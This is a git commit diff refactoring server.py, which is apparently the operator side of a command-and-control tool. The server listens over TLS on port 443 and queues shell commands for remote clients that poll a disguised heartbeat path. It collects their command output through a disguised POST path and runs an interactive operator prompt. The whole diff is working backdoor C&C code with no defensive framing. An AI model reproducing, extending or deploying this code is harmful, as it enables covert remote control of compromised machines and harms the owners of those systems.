2e9a335136158c6d159f8e376ba45367d699d5d2
Oenomaus <theagenes@disroot.org>
2020-10-02 17:57:38 +0200

    reduce spaghetti factor

--- server.py
+++ server.py
@@ -23,10 +23,10 @@ PORT = args['port'] # 443
 CERT = args['cert'] # "server.crt"
 KEY = args['key'] # "server.key"
 
-# The HTTP headers our client will actually use
-# Yes, this is hacky
-heartbeat_get = b"GET /YXNmYXNkZnNk" # used by the client to ask for commands / check for server heartbeat
-response_post = b"POST /dmJ2YnZiZGZh" # used by the client to return command std:out and std:err
+# Paths used by the client for C&C
+# ToDo: change these automatically?
+path_heartbeat = "/YXNmYXNkZnNk"
+path_command_response = "/dmJ2YnZiZGZh"
 
 # Queues for thread interaction
 command_queue = Queue() # command queue
@@ -45,13 +45,13 @@ def deq(qu, timeout=None):
     except Empty:
         return None
 
-# expects all input to be utf-8 strings
+# hack together a simple HTTP response
+# expects all input to be regular utf-8 strings
 def build_response(headers, payload, response_type="200 OK"):
     res = "HTTP/1.1 {}\r\n".format(response_type)
-
     if len(payload):
-        headers["Content-Length"] = len(payload)        
-    
+        headers["Content-Length"] = len(payload)
+
     for key in headers:
         res += str(key) + ": " + str(headers[key]) + "\r\n"
     
@@ -59,53 +59,67 @@ def build_response(headers, payload, response_type="200 OK"):
     res += payload
     return res.encode("utf-8")
 
-# don't bother with type checking, if there is a parsing problem then just hit them with a 400
-def parse_headers(header_bytes):
-    headers = {}
-    header_str = header_bytes.decode("utf-8")
+# HTTP request
+# Don't bother with meticulous exception handling, if the input is malformed, just error out
+class Request:
+    def __init__(self, received):
+        # split head section and body section
+        head_and_body = received.split(b"\r\n\r\n", 1)
+        self.HEAD = head_and_body[0] 
+        self.BODY = head_and_body[1] # allow this to throw an exception if there is no \r\n\r\n
 
-    for line in header_str.splitlines():
-        key_and_value = line.split(":", 1)
-        
-        if len(key_and_value) < 2:
-            continue
-        
-        key, value = key_and_value
-        headers[key.lower()] = value.strip()
-    
-    return headers
-   
+        # Split request line and headers
+        request_and_headers = self.HEAD.split(b"\r\n", 1)
+        request_line = request_and_headers[0]
+        header_lines = request_and_headers[1] if len(request_and_headers) > 1 else b"" # can be empty
+
+        # parse request line
+        self.METHOD, self.PATH, self.PROTOCOL = self.parse_request_line(request_line)
+
+        # parse headers
+        self.HEADERS = self.parse_headers(header_lines)
+
+    def parse_request_line(self, line_bytes):
+        return line_bytes.decode("utf-8").split(" ")
+
+    def parse_headers(self, header_bytes):
+        headers = {}
+        header_str = header_bytes.decode("utf-8")
+        for line in header_str.splitlines():
+            key_and_value = line.split(":", 1)
+            
+            if len(key_and_value) < 2:
+                continue # ignore invalid headers
+
+            key, value = key_and_value
+            headers[key.lower()] = value.strip()
+        return headers
+
 # Interact with client
 def handle_client(conn, source):
     try:
-        received = conn.recv() # receive first chunk
+        received = conn.recv() # receive first chunk of data
 
-        # split head section and body section
-        head_and_body = received.split(b"\r\n\r\n", 1)
-        head = head_and_body[0]
-        body = head_and_body[1] or b""
-
-        # parse headers
-        headers = parse_headers(head)
+        # if there is a parsing problem at this stage, then just hit them with the old 400
+        req = Request(received)
         
         # Look for Content-Length header
-        content_length_str = headers.get("content-length")
+        content_length_value = req.HEADERS.get("content-length")
         
-        if content_length_str:
-            content_length = int(content_length_str)
-
+        # Acquire potentially missing HTTP content from socket
+        if content_length_value:
+            content_length = int(content_length_value)
             #print("Content-Length parsed: {}".format(content_length))
 
-            # Acquire missing HTTP content from socket
-            while len(body) < content_length:
+            while len(req.BODY) < content_length:
                 chunk = conn.recv()
                 if not chunk:
                     print("[!] Received data != Content-Length")
                     break
-                body += chunk
+                req.BODY += chunk
 
         # Client asks for commands
-        if received.startswith(heartbeat_get):
+        if req.METHOD == "GET" and req.PATH.startswith(path_heartbeat):
             command = deq(command_queue) # get command from queue or <None>
 
             response_headers = {
@@ -122,8 +136,8 @@ def handle_client(conn, source):
             return
 
         # Client returns command response
-        if received.startswith(response_post):
-            output_queue.put(body) # hand over command output to I/O loop
+        if req.METHOD == "POST" and req.PATH.startswith(path_command_response):
+            output_queue.put(req.BODY) # hand over command output to I/O loop
 
             # respond whatever
             response_headers = {
@@ -131,7 +145,6 @@ def handle_client(conn, source):
                 "Connection": "Closed"
             }
             response_payload = "Sasquatch"
-
             conn.write(build_response(headers=response_headers, payload=response_payload))
             conn.close()
             return
@@ -141,11 +154,10 @@ def handle_client(conn, source):
         conn.close()
 
     except Exception as e:
-        #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
-        #print(e)
+        print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
+        print(e)
         if conn:
-            build_response(headers={"Connection": "Closed"}, payload="", response_type="400 Bad Request")
-            conn.write(b"HTTP/1.1 400 Bad Request\r\nConnection: Closed\r\n\r\n")
+            conn.write(build_response(headers={"Connection": "Closed"}, payload="", response_type="400 Bad Request"))
             conn.close()
 
 # Create SSL/TLS context which we use to wrap all incoming connections
@@ -161,19 +173,16 @@ sock.bind((HOST, PORT))
 sock.listen(5)
 print("[*] Listening on port {}...".format(PORT))
 
-# Listening Loop
+# Network Loop
 def listening_loop():
     while not interrupted:
         conn = None
         incoming_socket, incoming_addr = sock.accept()
-
         try:
             conn = context.wrap_socket(incoming_socket, server_side=True)
             handle_client(conn, incoming_addr)
-    
         except ssl.SSLError as e:
             print(e)
-
         finally:
             if conn:
                 conn.close()
@@ -183,6 +192,8 @@ server_thread = threading.Thread(target=listening_loop)
 server_thread.setDaemon(True)
 server_thread.start()
 
+# Horrible way of doing this, but I don't want to use a library, requirements are for chumps
+# ToDo: figure out proper way
 def figure_out_charset(input_bytes):
     encodings = ["utf-8", "ascii", "latin_1", "cp1251", "cp1252", "cp1250", "cp424", "cp437", "big5", "big5hkscs", "shift_jis"]
     for encoding in encodings:
@@ -192,8 +203,7 @@ def figure_out_charset(input_bytes):
             return output
         except:
             pass
-    return input_bytes
-
+    return input_bytes # just return bytes string if nothing fit the input
 
 # Decide what and how to display command response/error
 def display_response(response):
@@ -208,7 +218,7 @@ def display_response(response):
         print("Error:", figure_out_charset(dec))
 
 # I/O Loop
-response_timeout = 10
+response_timeout = 10 # seconds
 try: 
     while not interrupted:
         user_input = input("> ")
